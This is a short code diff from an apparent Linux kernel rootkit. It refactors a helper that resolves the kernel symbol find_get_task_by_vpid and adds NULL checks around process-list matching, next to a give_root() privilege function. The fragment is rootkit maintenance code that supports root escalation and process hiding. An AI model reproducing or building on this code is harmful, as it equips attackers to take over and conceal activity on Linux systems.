@@ -209,6 +209,26 @@ long give_root(const pid_t i32_pid, const int i32_sig)
     return 0;
 }
 
+static task_t *get_task_struct_by_pid(const pid_t i32_pid)
+{
+    task_t *p_task = NULL; // Task structure
+
+    IF_U (_find_get_task_by_vpid == NULL) {
+        _find_get_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");
+
+        pr_info("[ROOTKIT]   * `find_get_task_by_vpid()` address: %p\n", _find_get_task_by_vpid);
+
+        IF_U (_find_get_task_by_vpid == NULL) {
+            pr_err("[ROOTKIT]   * Failed to get `find_get_task_by_vpid()` address\n");
+            return NULL;
+        }
+    }
+
+    p_task = _find_get_task_by_vpid(i32_pid);
+
+    return p_task;
+}
+
 static bool is_pid_in_list(pid_t *const p_pid, task_t **const pp_task,
                            const struct list_head *const p_pid_list)
 {
@@ -241,23 +261,12 @@ static bool is_pid_in_list(pid_t *const p_pid, task_t **const pp_task,
             p_task = get_task_struct(current);
         }
         else {
-            IF_U (_find_get_task_by_vpid == NULL) {
-                _find_get_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");
-
-                pr_info("[ROOTKIT]   * `find_get_task_by_vpid()` address: %p\n",
-                        _find_get_task_by_vpid);
-
-                IF_U (_find_get_task_by_vpid == NULL) {
-                    pr_err("[ROOTKIT]   * Failed to get `find_get_task_by_vpid()` address\n");
-                    return false;
-                }
-            }
-
-            p_task = _find_get_task_by_vpid(i32_pid);
+            p_task = get_task_struct_by_pid(i32_pid);
         }
 
         IF_U (p_task == NULL) {
             pr_err("[ROOTKIT]   * Failed to get task struct\n");
+            *pp_task = NULL;
             return false;
         }
 
@@ -322,6 +331,10 @@ static bool is_pid_or_parent_in_list(const pid_t i32_pid, const struct list_head
     IF_U (b_ret) {
         pr_info("[ROOTKIT]   * PID %d matches!\n", i32_real_pid);
         goto loop_end;
+    }
+
+    IF_U (p_task == NULL) {
+        return false;
     }
 
     // Check if one of the given process' parents is in the list
